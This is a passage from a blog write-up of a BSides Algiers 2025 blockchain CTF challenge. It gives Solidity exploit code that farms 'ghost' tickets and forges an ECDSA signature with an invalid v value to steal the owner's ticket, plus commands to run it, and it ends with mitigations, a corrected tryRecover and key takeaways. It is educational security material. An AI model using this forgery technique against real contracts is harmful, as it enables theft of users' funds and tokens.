+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>constructor</span>(<span style=color:#66d9ef>address</span> _party, <span style=color:#66d9ef>address</span> _player) {
+</span></span><span style=display:flex><span>        party <span style=color:#f92672>=</span> IParty(_party);
+</span></span><span style=display:flex><span>        player <span style=color:#f92672>=</span> _player;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>attack</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span> {
+</span></span><span style=display:flex><span>        require(msg.value <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>, <span style=color:#e6db74>&#34;Need 1 ETH&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Buy a ticket
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.buy{value<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>}();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Get the ticket ID
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>uint256</span> ticketId <span style=color:#f92672>=</span> party.ticketCounter();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Withdraw to get ETH back
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.withdraw(ticketId);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Transfer the ticket to player
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// This creates a &#34;ghost&#34; balance
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        party.transfer(player, ticketId);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Return remaining ETH
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>address</span>(this).balance <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>payable</span>(player).transfer(<span style=color:#66d9ef>address</span>(this).balance);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    receive() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span> {}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>Solve</span> <span style=color:#66d9ef>is</span> Script {
+</span></span><span style=display:flex><span>    ISetup <span style=color:#66d9ef>public</span> setup;
+</span></span><span style=display:flex><span>    IParty <span style=color:#66d9ef>public</span> party;
+</span></span><span style=display:flex><span>    IGuardian <span style=color:#66d9ef>public</span> guardian;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> owner;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> player;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint256</span> <span style=color:#66d9ef>public</span> playerKey;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>run</span>() <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Get setup parameters from environment
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>address</span> setupAddr <span style=color:#f92672>=</span> vm.envAddress(<span style=color:#e6db74>&#34;SETUP_ADDRESS&#34;</span>);
+</span></span><span style=display:flex><span>        playerKey <span style=color:#f92672>=</span> vm.envUint(<span style=color:#e6db74>&#34;PLAYER_PRIVATE_KEY&#34;</span>);
+</span></span><span style=display:flex><span>        player <span style=color:#f92672>=</span> vm.addr(playerKey);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        setup <span style=color:#f92672>=</span> ISetup(setupAddr);
+</span></span><span style=display:flex><span>        party <span style=color:#f92672>=</span> setup.party();
+</span></span><span style=display:flex><span>        guardian <span style=color:#f92672>=</span> setup.guardian();
+</span></span><span style=display:flex><span>        owner <span style=color:#f92672>=</span> setup.owner();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;=== Initial State ===&#34;</span>);
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Owner balance:&#34;</span>, party.balances(owner));
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Player balance:&#34;</span>, party.balances(player));
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Locked ETH:&#34;</span>, party.lockedETH());
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        vm.startBroadcast(playerKey);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Phase 1: Unlock Guardian
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        unlockGuardian();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Phase 2: Accumulate Tickets
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        accumulateTickets();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Phase 3: Steal Owner&#39;s Ticket
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        stealOwnerTicket();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        vm.stopBroadcast();
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>=== Final State ===&#34;</span>);
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Owner balance:&#34;</span>, party.balances(owner));
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Player balance:&#34;</span>, party.balances(player));
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Locked ETH:&#34;</span>, party.lockedETH());
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;Solved:&#34;</span>, setup.isSolved());
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>unlockGuardian</span>() <span style=color:#66d9ef>internal</span> {
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[Phase 1] Unlocking Guardian...&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> guardian.startParty(<span style=color:#66d9ef>address</span>(<span style=color:#ae81ff>0</span>), <span style=color:#e6db74>&#34;&#34;</span>) {
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;✓ Guardian unlocked successfully&#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> Error(<span style=color:#66d9ef>string</span> <span style=color:#66d9ef>memory</span> reason) {
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;✗ Failed to unlock:&#34;</span>, reason);
+</span></span><span style=display:flex><span>            revert(<span style=color:#e6db74>&#34;Guardian unlock failed&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>accumulateTickets</span>() <span style=color:#66d9ef>internal</span> {
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[Phase 2] Accumulating Tickets...&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint256</span> currentBalance <span style=color:#f92672>=</span> party.balances(player);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint256</span> requiredTickets <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (currentBalance <span style=color:#f92672>&lt;</span> requiredTickets) {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Deploy ghost minter
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            GhostMinter ghost <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> GhostMinter(<span style=color:#66d9ef>address</span>(party), player);
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Execute attack
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            ghost.attack{value<span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>}();
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            currentBalance <span style=color:#f92672>=</span> party.balances(player);
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;Player balance after ghost attack:&#34;</span>, currentBalance);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;✓ Accumulated sufficient tickets&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>stealOwnerTicket</span>() <span style=color:#66d9ef>internal</span> {
+</span></span><span style=display:flex><span>        console.log(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[Phase 3] Stealing Owner&#39;s Ticket...&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (party.balances(owner) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;Owner has no tickets to steal&#34;</span>);
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Find owner&#39;s ticket ID (usually ticket #1)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>uint256</span> ownerTicketId <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>        require(party.ownerOf(ownerTicketId) <span style=color:#f92672>==</span> owner, <span style=color:#e6db74>&#34;Owner doesn&#39;t own ticket #1&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Create order
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        Order[] <span style=color:#66d9ef>memory</span> orders <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Order[](<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>        orders[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> Order({
+</span></span><span style=display:flex><span>            host<span style=color:#f92672>:</span> User(owner, <span style=color:#e6db74>&#34;&#34;</span>),
+</span></span><span style=display:flex><span>            invited<span style=color:#f92672>:</span> User(player, <span style=color:#e6db74>&#34;&#34;</span>),
+</span></span><span style=display:flex><span>            values<span style=color:#f92672>:</span> [<span style=color:#66d9ef>uint256</span>(<span style=color:#ae81ff>1</span>), ownerTicketId]  <span style=color:#75715e>// nonce=1, ticketId
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        });
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Prepare signature arrays
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] <span style=color:#66d9ef>memory</span> rs;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] <span style=color:#66d9ef>memory</span> ss;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint</span>[<span style=color:#ae81ff>2</span>] <span style=color:#66d9ef>memory</span> vs;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Valid signature for invited (player)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>bytes32</span> invitedHash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(
+</span></span><span style=display:flex><span>            player,
+</span></span><span style=display:flex><span>            owner,
+</span></span><span style=display:flex><span>            ownerTicketId
+</span></span><span style=display:flex><span>        ));
+</span></span><span style=display:flex><span>        (<span style=color:#66d9ef>uint8</span> vInvited, <span style=color:#66d9ef>bytes32</span> rInvited, <span style=color:#66d9ef>bytes32</span> sInvited) <span style=color:#f92672>=</span> vm.sign(
+</span></span><span style=display:flex><span>            playerKey,
+</span></span><span style=display:flex><span>            invitedHash
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>        vs[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> vInvited;
+</span></span><span style=display:flex><span>        rs[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> rInvited;
+</span></span><span style=display:flex><span>        ss[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> sInvited;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Forged signature for host (owner)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// Exploit: v=0 causes ecrecover to fail, s contains owner address
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        vs[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;  <span style=color:#75715e>// Invalid v
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        rs[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>bytes32</span>(<span style=color:#66d9ef>uint256</span>(<span style=color:#ae81ff>1</span>));  <span style=color:#75715e>// Arbitrary r
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        ss[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>bytes32</span>(<span style=color:#66d9ef>uint256</span>(<span style=color:#66d9ef>uint160</span>(owner)));  <span style=color:#75715e>// Owner address as s!
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> guardian.batchTransaction(orders, rs, ss, vs) {
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;✓ Successfully stole owner&#39;s ticket!&#34;</span>);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> Error(<span style=color:#66d9ef>string</span> <span style=color:#66d9ef>memory</span> reason) {
+</span></span><span style=display:flex><span>            console.log(<span style=color:#e6db74>&#34;✗ Ticket theft failed:&#34;</span>, reason);
+</span></span><span style=display:flex><span>            revert(<span style=color:#e6db74>&#34;Ticket theft failed&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=deployment-and-execution><a class=header-anchor href=#deployment-and-execution></a>Deployment and Execution</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Set environment variables</span>
+</span></span><span style=display:flex><span>export SETUP_ADDRESS<span style=color:#f92672>=</span>&lt;deployed_setup_address&gt;
+</span></span><span style=display:flex><span>export PLAYER_PRIVATE_KEY<span style=color:#f92672>=</span>&lt;your_private_key&gt;
+</span></span><span style=display:flex><span>export RPC_URL<span style=color:#f92672>=</span>&lt;rpc_endpoint&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Run the exploit</span>
+</span></span><span style=display:flex><span>forge script Solve --rpc-url $RPC_URL --broadcast -vvvv
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Verify solution</span>
+</span></span><span style=display:flex><span>cast call $SETUP_ADDRESS <span style=color:#e6db74>&#34;isSolved()&#34;</span> --rpc-url $RPC_URL
+</span></span><span style=display:flex><span><span style=color:#75715e># Returns: true (0x0000...0001)</span>
+</span></span></code></pre></div><h2 id=why-each-step-is-necessary><a class=header-anchor href=#why-each-step-is-necessary></a>Why Each Step is Necessary</h2><h3 id=step-1-unlocking-is-required><a class=header-anchor href=#step-1-unlocking-is-required></a>Step 1: Unlocking is Required</h3><p>Without unlocking the Guardian, all calls to <code>batchTransaction</code> will revert with &ldquo;Party not started&rdquo;. This is enforced by the <code>onlyUnlocked</code> modifier.</p><h3 id=step-2-multiple-tickets-required><a class=header-anchor href=#step-2-multiple-tickets-required></a>Step 2: Multiple Tickets Required</h3><p>The win condition explicitly checks <code>party.balances(player) > 1</code>. A single ticket stolen from the owner would only give us 1 ticket total, failing this check.</p><h3 id=step-3-zero-locked-eth-required><a class=header-anchor href=#step-3-zero-locked-eth-required></a>Step 3: Zero Locked ETH Required</h3><p>The ghost minter attack serves dual purpose:</p><ul><li>Accumulates tickets for the player</li><li>Returns the ETH via withdraw, ensuring <code>lockedETH == 0</code></li></ul><h2 id=security-analysis-and-mitigation><a class=header-anchor href=#security-analysis-and-mitigation></a>Security Analysis and Mitigation</h2><h3 id=the-root-cause><a class=header-anchor href=#the-root-cause></a>The Root Cause</h3><p>The vulnerability stems from three compounding issues:</p><ol><li><strong>Unchecked Return Values</strong>: The <code>pop(staticcall(...))</code> pattern discards the success/failure status</li><li><strong>Memory Manipulation</strong>: The XOR-based offset calculation assumes memory state</li><li><strong>Lack of Input Validation</strong>: No checks on <code>v</code> parameter validity</li></ol><h3 id=proper-implementation><a class=header-anchor href=#proper-implementation></a>Proper Implementation</h3><p>Here&rsquo;s how <code>tryRecover</code> should be implemented:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>tryRecover</span>(
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bytes32</span> hash,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8</span> v,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bytes32</span> r,
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bytes32</span> s
+</span></span><span style=display:flex><span>) <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span> result) {
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// Validate v parameter
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (v <span style=color:#f92672>!=</span> <span style=color:#ae81ff>27</span> <span style=color:#f92672>&amp;&amp;</span> v <span style=color:#f92672>!=</span> <span style=color:#ae81ff>28</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>address</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assembly</span> {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>let</span> m <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#ae81ff>0x40</span>)
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mstore</span>(m, hash)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x20</span>), v)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), r)
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x60</span>), s)
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Check the return value!
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#f92672>let</span> success <span style=color:#f92672>:=</span> <span style=color:#a6e22e>staticcall</span>(<span style=color:#a6e22e>gas</span>(), <span style=color:#ae81ff>1</span>, m, <span style=color:#ae81ff>0x80</span>, <span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), <span style=color:#ae81ff>0x20</span>)
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        if success {
+</span></span><span style=display:flex><span>            result <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>))
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// If not success, result remains address(0)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=alternative-use-openzeppelin><a class=header-anchor href=#alternative-use-openzeppelin></a>Alternative: Use OpenZeppelin</h3><p>OpenZeppelin&rsquo;s ECDSA library handles all edge cases correctly:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#e6db74>&#34;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>verify</span>(<span style=color:#66d9ef>bytes32</span> hash, <span style=color:#66d9ef>bytes</span> <span style=color:#66d9ef>memory</span> signature) <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>pure</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ECDSA.recover(hash, signature);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=key-takeaways><a class=header-anchor href=#key-takeaways></a>Key Takeaways</h2><ol><li><strong>Always check return values</strong> from low-level calls, especially in assembly</li><li><strong>Never trust memory state</strong> - the EVM doesn&rsquo;t clear memory automatically</li><li><strong>Validate inputs</strong> before passing to precompiles (e.g., check v ∈ {27, 28})</li><li><strong>Use battle-tested libraries</strong> like OpenZeppelin instead of custom crypto implementations</li><li><strong>Assembly is dangerous</strong> - only use when absolutely necessary and audit thoroughly</li><li><strong>Multiple vulnerabilities compound</strong> - this challenge required chaining three separate exploits</li></ol><h2 id=references><a class=header-anchor href=#references></a>References</h2><ul><li><a href=https://swcregistry.io/docs/SWC-104>SWC-104: Unchecked Call Return Values</a></li><li><a href=https://ethereum.github.io/yellowpaper/paper.pdf>Ethereum Yellow Paper - Precompiled Contracts</a></li><li><a href=https://eips.ethereum.org/EIPS/eip-1>EIP-1: ecrecover Precompile</a></li><li><a href=https://docs.soliditylang.org/en/latest/assembly.html>Solidity Assembly Documentation</a></li><li><a href=https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA>OpenZeppelin ECDSA Library</a></li><li><a href=https://github.com/crytic/building-secure-contracts>Trail of Bits: Building Secure Contracts</a></li></ul><hr><p><strong>Challenge Author</strong>: 0xbrivan<br><strong>CTF</strong>: BSides Algiers 2025<br><strong>Category</strong>: Blockchain<br><strong>Writeup by</strong>: Koyphshi</p></div><footer class=article-footer><ul class=article-category-list><li class=article-tag-list-item data-aos=zoom-in><a class=article-category-link href=/categories/ctf data-aos=zoom-in>ctf</a></li></ul></footer></div><nav id=article-nav aria-label="Article navigation" data-aos=fade-up><div class="article-nav-link-wrap left"><img data-src=https://d-sketon.top/img/_backwebp/bg1.webp data-sizes=auto alt=Geni class=lazyload><a href=/posts/geni/ aria-label=Prev:Geni title=Prev:Geni></a><div class=article-nav-caption>Prev</div><h3 class=article-nav-title>Geni</h3></div></nav></article></section></div><footer id=footer aria-label="Site footer"><div style=width:100%;overflow:hidden><div class=footer-line></div></div><div id=footer-info><div><span class=icon-copyright></span>2020-2026<span class="footer-info-sep rotate"></span>Koyphshi</div><div>Powered by&nbsp;<a href=https://gohugo.io/ target=_blank rel="noopener nofollow noreferrer">Hugo</a>&nbsp;Theme.<a href=https://github.com/D-Sketon/hugo-theme-reimu target=_blank rel="noopener nofollow noreferrer">Reimu</a></div><div><span class=icon-brush>&nbsp;9.0k</span>
+&nbsp;|&nbsp;
+<span class=icon-coffee>&nbsp;00:46</span></div><div><span class=icon-eye></span>
+<span id=busuanzi_container_site_pv>Number of visits&nbsp;<span id=busuanzi_value_site_pv></span></span>
+&nbsp;|&nbsp;
+<span class=icon-user></span>
+<span id=busuanzi_container_site_uv>Number of visitors&nbsp;<span id=busuanzi_value_site_uv></span></span></div></div></footer><div class=sidebar-top><div class="sidebar-top-taichi rotate"></div><div class=arrow-up></div></div><div id=mask class=hide></div></div><nav id=mobile-nav aria-label="Mobile navigation"><div class=sidebar-wrap><div class=sidebar-toc-sidebar><h3 class=toc-title>Contents</h3><div class="sidebar-toc-wrapper toc-div-class"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#file-analysis>File Analysis</a><ul><li><a href=#1-partysol>1. Party.sol</a></li><li><a href=#2-ecdsasol>2. ECDSA.sol</a></li><li><a href=#3-setupsol>3. Setup.sol</a></li></ul></li><li><a href=#the-vulnerability-deep-dive>The Vulnerability Deep Dive</a><ul><li><a href=#understanding-ecrecover-precompile>Understanding ecrecover Precompile</a></li><li><a href=#the-critical-flaw-in-tryrecover>The Critical Flaw in tryRecover</a></li><li><a href=#why-this-works-evm-memory-persistence>Why This Works: EVM Memory Persistence</a></li></ul></li><li><a href=#exploitation-strategy>Exploitation Strategy</a><ul><li><a href=#phase-1-unlocking-the-guardian>Phase 1: Unlocking the Guardian</a></li><li><a href=#phase-2-accumulating-tickets-ghost-balance-attack>Phase 2: Accumulating Tickets (Ghost Balance Attack)</a></li><li><a href=#phase-3-stealing-the-owners-ticket>Phase 3: Stealing the Owner&rsquo;s Ticket</a></li></ul></li><li><a href=#complete-exploit-implementation>Complete Exploit Implementation</a></li><li><a href=#deployment-and-execution>Deployment and Execution</a></li><li><a href=#why-each-step-is-necessary>Why Each Step is Necessary</a><ul><li><a href=#step-1-unlocking-is-required>Step 1: Unlocking is Required</a></li><li><a href=#step-2-multiple-tickets-required>Step 2: Multiple Tickets Required</a></li><li><a href=#step-3-zero-locked-eth-required>Step 3: Zero Locked ETH Required</a></li></ul></li><li><a href=#security-analysis-and-mitigation>Security Analysis and Mitigation</a><ul><li><a href=#the-root-cause>The Root Cause</a></li><li><a href=#proper-implementation>Proper Implementation</a></li><li><a href=#alternative-use-openzeppelin>Alternative: Use OpenZeppelin</a></li></ul></li><li><a href=#key-takeaways>Key Takeaways</a></li><li><a href=#references>References</a></li></ul></nav></div></div><div class="sidebar-common-sidebar hidden"><div class=sidebar-author><img data-src=/%20avatar/avatar.png data-sizes=auto alt=Koyphshi class=lazyload><div class=sidebar-author-name>Koyphshi</div><div class=sidebar-description>Koyphshi - My Personal Blog (Dark & Premium)</div></div><div class=sidebar-state><div class=sidebar-state-article><div>Posts</div><div class=sidebar-state-number>5</div></div><a class=sidebar-state-category href=/%20categories/ aria-label=sidebar-state-category-link><div>Categories</div><div class=sidebar-state-number>2</div></a></div><div class=sidebar-social><div class="icon-github sidebar-social-icon"><a href=https://github.com/LanacerYasser itemprop=url target=_blank aria-label=github rel="noopener nofollow noreferrer"></a></div><div class="icon-linkedin sidebar-social-icon"><a href=https://www.linkedin.com/in/yasser-lanacer-1903442a8/ itemprop=url target=_blank aria-label=linkedin rel="noopener nofollow noreferrer"></a></div></div><div class=sidebar-menu><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/ aria-label=Home></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Home</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/archives aria-label=Archives></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Archives</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/friend aria-label=Friend></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Friend</div></div></div></div></div><div class=sidebar-btn-wrapper><div class="sidebar-toc-btn current"></div><div class=sidebar-common-btn></div></div></nav></div><script src=https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js integrity=sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf+e crossorigin=anonymous></script><script src=https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js integrity=sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q crossorigin=anonymous></script><script src=/js/main.js integrity crossorigin=anonymous></script><script src=/js/aos.js integrity crossorigin=anonymous></script><script>var 